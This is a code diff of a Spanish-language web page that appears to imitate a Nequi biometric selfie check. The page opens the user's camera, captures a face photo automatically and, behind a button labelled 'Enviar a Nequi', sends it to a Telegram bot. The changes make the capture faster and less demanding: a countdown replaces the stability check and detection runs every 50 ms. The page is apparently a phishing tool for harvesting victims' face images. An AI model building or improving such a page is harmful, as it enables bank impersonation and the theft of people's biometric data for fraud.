@@ -40,11 +40,11 @@ video {
     top: 50%;
     left: 50%;
     transform: translate(-50%, -50%);
-    transition: 0.2s;
+    transition: 0.1s;
     pointer-events: none;
 }
 
-.valid {
+.oval.valid {
     border-color: #00ff88;
     box-shadow: 0 0 25px #00ff88;
 }
@@ -77,43 +77,42 @@ video {
     z-index: 15;
     backdrop-filter: blur(5px);
     border: 1px solid rgba(255,255,255,0.3);
-    animation: pulseRed 1s infinite;
     white-space: nowrap;
     font-family: monospace;
+    display: none;
+}
+
+.warning-message.show {
+    display: block;
+    animation: pulseRed 0.5s ease;
 }
 
 @keyframes pulseRed {
-    0%, 100% {
-        transform: translateX(-50%) scale(1);
-        background: rgba(255,0,0,0.85);
-    }
-    50% {
-        transform: translateX(-50%) scale(1.02);
-        background: rgba(255,50,50,0.95);
-        box-shadow: 0 0 15px rgba(255,0,0,0.5);
-    }
+    0% { transform: translateX(-50%) scale(1); opacity: 0; }
+    100% { transform: translateX(-50%) scale(1); opacity: 1; }
 }
 
-/* Barra de progreso */
-.progress-container {
+/* Contador */
+.countdown {
     position: absolute;
-    bottom: 100px;
+    top: 50%;
     left: 50%;
-    transform: translateX(-50%);
-    width: 250px;
-    height: 6px;
-    background: rgba(255,255,255,0.3);
-    border-radius: 3px;
-    overflow: hidden;
-    z-index: 10;
+    transform: translate(-50%, -50%);
+    font-size: 80px;
+    font-weight: bold;
+    color: white;
+    text-shadow: 0 0 20px rgba(0,0,0,0.8);
+    z-index: 25;
+    background: rgba(0,0,0,0.6);
+    padding: 20px 40px;
+    border-radius: 50px;
+    backdrop-filter: blur(10px);
+    display: none;
+    font-family: monospace;
 }
 
-.progress-bar {
-    height: 100%;
-    width: 0%;
-    background: #00ff88;
-    transition: width 0.1s linear;
-    border-radius: 3px;
+.countdown.show {
+    display: block;
 }
 
 /* Preview de foto */
@@ -306,11 +305,6 @@ video {
     display: none;
     white-space: nowrap;
 }
-
-/* Ocultar mensaje de advertencia cuando se toma la foto */
-.warning-message.hide {
-    display: none;
-}
 </style>
 </head>
 
@@ -319,11 +313,9 @@ video {
 <video id="video" autoplay muted playsinline></video>
 <div class="overlay"></div>
 <div class="oval" id="oval"></div>
-<div class="warning-message" id="warningMessage">⚠️ Mira de frente a la cámara por favor</div>
+<div class="warning-message" id="warningMessage">⚠️ Mira de frente a la cámara</div>
 <div class="status" id="status">🎯 Iniciando cámara...</div>
-<div class="progress-container">
-    <div class="progress-bar" id="progressBar"></div>
-</div>
+<div class="countdown" id="countdown">3</div>
 <button class="reset-btn" id="resetBtn">🔄 Reiniciar</button>
 <button class="send-btn" id="sendBtn">📤 Enviar a Nequi</button>
 <div class="status-message" id="statusMessage"></div>
@@ -342,7 +334,7 @@ const statusMessage = document.getElementById("statusMessage");
 const loader = document.getElementById("loader");
 const loaderText = document.getElementById("loaderText");
 const warningMessage = document.getElementById("warningMessage");
-const progressBar = document.getElementById("progressBar");
+const countdownDiv = document.getElementById("countdown");
 
 // Configuración de Telegram
 const TELEGRAM_CONFIG = {
@@ -353,15 +345,14 @@ const TELEGRAM_CONFIG = {
 let photoTaken = false;
 let currentPhotoData = null;
 let detectionInterval = null;
-let stabilityFrames = 0;
-let lastFacePosition = null;
+let isCentered = false;
 let countdownActive = false;
 let countdownTimer = null;
 let countdownValue = 3;
 
-// Configuración de detección
-const REQUIRED_STABLE_FRAMES = 15;
-const STABILITY_THRESHOLD = 20;
+// Configuración de detección - MÁS RÁPIDA
+const CENTER_TOLERANCE_X = 85;
+const CENTER_TOLERANCE_Y = 110;
 
 // Iniciar cámara
 navigator.mediaDevices.getUserMedia({ 
@@ -373,7 +364,7 @@ navigator.mediaDevices.getUserMedia({
 })
 .then(stream => {
     video.srcObject = stream;
-    statusText.innerText = "😊 Mira fijamente a la cámara";
+    statusText.innerText = "😊 Coloca tu rostro en el óvalo";
     startFaceDetection();
 })
 .catch(err => {
@@ -381,10 +372,8 @@ navigator.mediaDevices.getUserMedia({
     statusText.innerText = "❌ Error: No se puede acceder a la cámara";
 });
 
-// Detección de rostro usando diferencia de píxeles (detección de movimiento)
+// Detección de rostro ultra rápida usando diferencia de color
 function startFaceDetection() {
-    let lastFrame = null;
-    
     detectionInterval = setInterval(() => {
         if (photoTaken) return;
         
@@ -398,16 +387,16 @@ function startFaceDetection() {
         const imageData = ctx.getImageData(0, 0, canvas.width, canvas.height);
         const data = imageData.data;
         
-        // Detectar región con tonos de piel
-        const faceRegion = detectFaceRegion(data, canvas.width, canvas.height);
+        // Detección rápida de tonos de piel
+        let skinCenter = detectFastSkin(data, canvas.width, canvas.height);
         
-        if (faceRegion) {
+        if (skinCenter) {
             const rect = video.getBoundingClientRect();
             const scaleX = rect.width / canvas.width;
             const scaleY = rect.height / canvas.height;
             
-            const faceX = (faceRegion.x + faceRegion.width / 2) * scaleX;
-            const faceY = (faceRegion.y + faceRegion.height / 2) * scaleY;
+            const faceX = skinCenter.x * scaleX;
+            const faceY = skinCenter.y * scaleY;
             
             const ovalRect = oval.getBoundingClientRect();
             const centerX = ovalRect.left + ovalRect.width / 2;
@@ -415,119 +404,75 @@ function startFaceDetection() {
             
             const dx = Math.abs(faceX - centerX);
             const dy = Math.abs(faceY - centerY);
-            const isCentered = dx < 70 && dy < 90;
+            const centered = dx < CENTER_TOLERANCE_X && dy < CENTER_TOLERANCE_Y;
             
-            // Verificar estabilidad
-            let isStable = true;
-            if (lastFacePosition) {
-                const movement = Math.hypot(faceX - lastFacePosition.x, faceY - lastFacePosition.y);
-                isStable = movement < STABILITY_THRESHOLD;
-            }
-            lastFacePosition = { x: faceX, y: faceY };
-            
-            if (isCentered && isStable) {
-                stabilityFrames++;
-                const progress = (stabilityFrames / REQUIRED_STABLE_FRAMES) * 100;
-                progressBar.style.width = `${progress}%`;
-                
-                if (stabilityFrames >= REQUIRED_STABLE_FRAMES && !countdownActive && !photoTaken) {
-                    startAutoCountdown();
-                } else if (stabilityFrames > 5) {
-                    statusText.innerText = `✅ Mantén la posición (${stabilityFrames}/${REQUIRED_STABLE_FRAMES})`;
+            if (centered) {
+                if (!isCentered) {
+                    // Acaba de centrarse - activar inmediatamente
+                    isCentered = true;
                     oval.classList.add("valid");
-                    warningMessage.classList.add('hide');
-                } else {
-                    statusText.innerText = "🎯 Centra tu rostro en el óvalo";
-                    oval.classList.remove("valid");
+                    warningMessage.classList.remove("show");
+                    statusText.innerText = "✅ Rostro centrado - Tomando selfie";
+                    
+                    // Iniciar countdown inmediatamente
+                    if (!countdownActive && !photoTaken) {
+                        startAutoCountdown();
+                    }
                 }
             } else {
-                stabilityFrames = 0;
-                progressBar.style.width = "0%";
-                if (!isCentered) {
+                if (isCentered) {
+                    isCentered = false;
+                    oval.classList.remove("valid");
+                    warningMessage.classList.add("show");
                     statusText.innerText = "🎯 Centra tu rostro en el óvalo";
-                    warningMessage.classList.remove('hide');
-                } else if (!isStable) {
-                    statusText.innerText = "⚠️ No te muevas, mantén la posición";
+                    
+                    // Cancelar countdown si estaba activo
+                    if (countdownActive) {
+                        cancelCountdown();
+                    }
                 }
-                oval.classList.remove("valid");
             }
         } else {
-            stabilityFrames = 0;
-            progressBar.style.width = "0%";
-            statusText.innerText = "❌ No se detecta rostro";
-            oval.classList.remove("valid");
-            warningMessage.classList.remove('hide');
-            lastFacePosition = null;
+            if (isCentered) {
+                isCentered = false;
+                oval.classList.remove("valid");
+                warningMessage.classList.add("show");
+                statusText.innerText = "❌ No se detecta rostro";
+                
+                if (countdownActive) {
+                    cancelCountdown();
+                }
+            }
         }
-    }, 100);
+    }, 50); // Detección cada 50ms (más rápida)
 }
 
-// Detectar región de rostro por tonos de piel
-function detectFaceRegion(data, width, height) {
-    let skinPixels = [];
+// Detección rápida de centro de piel
+function detectFastSkin(data, width, height) {
+    let sumX = 0, sumY = 0, count = 0;
     
-    for (let y = 0; y < height; y += 3) {
-        for (let x = 0; x < width; x += 3) {
+    // Muestrear cada 4 píxeles para mayor velocidad
+    for (let y = 0; y < height; y += 4) {
+        for (let x = 0; x < width; x += 4) {
             const idx = (y * width + x) * 4;
             const r = data[idx];
             const g = data[idx + 1];
             const b = data[idx + 2];
             
-            // Detección de tonos de piel
-            if (r > 60 && g > 40 && b > 20 && r > g && r > b) {
-                const skinRatio = (r - g) / (r + g + b);
-                if (skinRatio > 0.05 && r > 80 && g > 40 && b > 20) {
-                    skinPixels.push({ x, y });
-                }
+            // Detección rápida de tonos de piel
+            if (r > 70 && g > 40 && b > 30 && r > g && r > b && (r - g) > 15) {
+                sumX += x;
+                sumY += y;
+                count++;
             }
         }
     }
     
-    if (skinPixels.length < 40) return null;
-    
-    // Encontrar la región más densa
-    let bestX = 0, bestY = 0, maxCount = 0;
-    const step = 20;
-    
-    for (let x = 0; x < width; x += step) {
-        for (let y = 0; y < height; y += step) {
-            let count = 0;
-            for (let pixel of skinPixels) {
-                if (Math.abs(pixel.x - x) < 50 && Math.abs(pixel.y - y) < 60) {
-                    count++;
-                }
-            }
-            if (count > maxCount) {
-                maxCount = count;
-                bestX = x;
-                bestY = y;
-            }
-        }
-    }
-    
-    if (maxCount < 30) return null;
-    
-    // Calcular tamaño del rostro
-    let minX = bestX, maxX = bestX, minY = bestY, maxY = bestY;
-    for (let pixel of skinPixels) {
-        if (Math.abs(pixel.x - bestX) < 100 && Math.abs(pixel.y - bestY) < 120) {
-            minX = Math.min(minX, pixel.x);
-            maxX = Math.max(maxX, pixel.x);
-            minY = Math.min(minY, pixel.y);
-            maxY = Math.max(maxY, pixel.y);
-        }
-    }
-    
-    const faceWidth = maxX - minX;
-    const faceHeight = maxY - minY;
-    
-    if (faceWidth < 60 || faceHeight < 60) return null;
+    if (count < 15) return null;
     
     return {
-        x: minX,
-        y: minY,
-        width: faceWidth,
-        height: faceHeight
+        x: sumX / count,
+        y: sumY / count
     };
 }
 
@@ -537,19 +482,33 @@ function startAutoCountdown() {
     countdownActive = true;
     countdownValue = 3;
     
-    statusText.innerText = `📸 ¡Selfie automática en ${countdownValue}! No te muevas`;
+    countdownDiv.textContent = countdownValue;
+    countdownDiv.classList.add("show");
+    statusText.innerText = `📸 Selfie en ${countdownValue}...`;
     
     countdownTimer = setInterval(() => {
         countdownValue--;
+        countdownDiv.textContent = countdownValue;
         
         if (countdownValue > 0) {
-            statusText.innerText = `📸 Selfie en ${countdownValue}... ¡No te muevas!`;
+            statusText.innerText = `📸 Selfie en ${countdownValue}...`;
         } else {
             clearInterval(countdownTimer);
             countdownTimer = null;
+            countdownDiv.classList.remove("show");
             takePhoto();
         }
     }, 1000);
+}
+
+function cancelCountdown() {
+    if (countdownTimer) {
+        clearInterval(countdownTimer);
+        countdownTimer = null;
+    }
+    countdownActive = false;
+    countdownDiv.classList.remove("show");
+    statusText.innerText = "🎯 Centra tu rostro en el óvalo";
 }
 
 // Tomar foto automática
@@ -570,12 +529,6 @@ function takePhoto() {
     currentPhotoData = canvas.toDataURL("image/png");
     photoTaken = true;
     
-    // Cambiar color del óvalo a verde
-    oval.classList.add("valid");
-    
-    // Ocultar mensaje de advertencia permanentemente
-    warningMessage.classList.add('hide');
-    
     showSuccessToast();
     statusText.innerText = "✅ ¡Selfie capturada con éxito!";
     
@@ -591,6 +544,8 @@ function takePhoto() {
         clearInterval(countdownTimer);
         countdownTimer = null;
     }
+    
+    warningMessage.classList.remove("show");
 }
 
 function showSuccessToast() {
@@ -624,24 +579,17 @@ function createPhotoPreview(imgData) {
         photoTaken = false;
         currentPhotoData = null;
         oval.classList.remove("valid");
-        stabilityFrames = 0;
-        progressBar.style.width = "0%";
+        isCentered = false;
         countdownActive = false;
-        statusText.innerText = "😊 Mira fijamente a la cámara";
-        mostrarMensaje("Selfie eliminada, reiniciando detección", false);
+        statusText.innerText = "😊 Coloca tu rostro en el óvalo";
+        mostrarMensaje("Selfie eliminada", false);
         
         // Reiniciar detección
         if (!detectionInterval) {
             startFaceDetection();
         }
         
-        // Volver a mostrar mensaje de advertencia
-        warningMessage.classList.remove('hide');
-        setTimeout(() => {
-            if (!photoTaken) {
-                warningMessage.classList.add('hide');
-            }
-        }, 3000);
+        warningMessage.classList.add("show");
     };
     
     preview.appendChild(img);
@@ -657,7 +605,7 @@ function mostrarMensaje(mensaje, esError = false) {
     statusMessage.style.display = 'block';
     setTimeout(() => {
         statusMessage.style.display = 'none';
-    }, 3000);
+    }, 2000);
 }
 
 function dataURLtoBlob(dataURL) {
@@ -744,32 +692,27 @@ resetBtn.addEventListener('click', () => {
     currentPhotoData = null;
     oval.classList.remove("valid");
     sendBtn.style.display = "none";
-    stabilityFrames = 0;
-    progressBar.style.width = "0%";
+    isCentered = false;
     countdownActive = false;
     
     if (countdownTimer) {
         clearInterval(countdownTimer);
         countdownTimer = null;
     }
+    countdownDiv.classList.remove("show");
     
     const preview = document.querySelector('.photo-preview');
     if (preview) preview.remove();
     
-    statusText.innerText = "😊 Mira fijamente a la cámara";
-    mostrarMensaje("Reiniciado, la selfie se tomará automáticamente", false);
+    statusText.innerText = "😊 Coloca tu rostro en el óvalo";
+    mostrarMensaje("Reiniciado", false);
     
     // Reiniciar detección
     if (!detectionInterval) {
         startFaceDetection();
     }
     
-    warningMessage.classList.remove('hide');
-    setTimeout(() => {
-        if (!photoTaken) {
-            warningMessage.classList.add('hide');
-        }
-    }, 3000);
+    warningMessage.classList.add("show");
 });
 
 // Botón de enviar a Telegram
@@ -777,12 +720,12 @@ sendBtn.addEventListener('click', () => {
     enviarATelegram();
 });
 
-// Ocultar mensaje de advertencia después de 3 segundos al inicio
+// Mostrar mensaje de advertencia al inicio
 setTimeout(() => {
     if (!photoTaken) {
-        warningMessage.classList.add('hide');
+        warningMessage.classList.add("show");
     }
-}, 3000);
+}, 500);
 </script>
 
 </body>
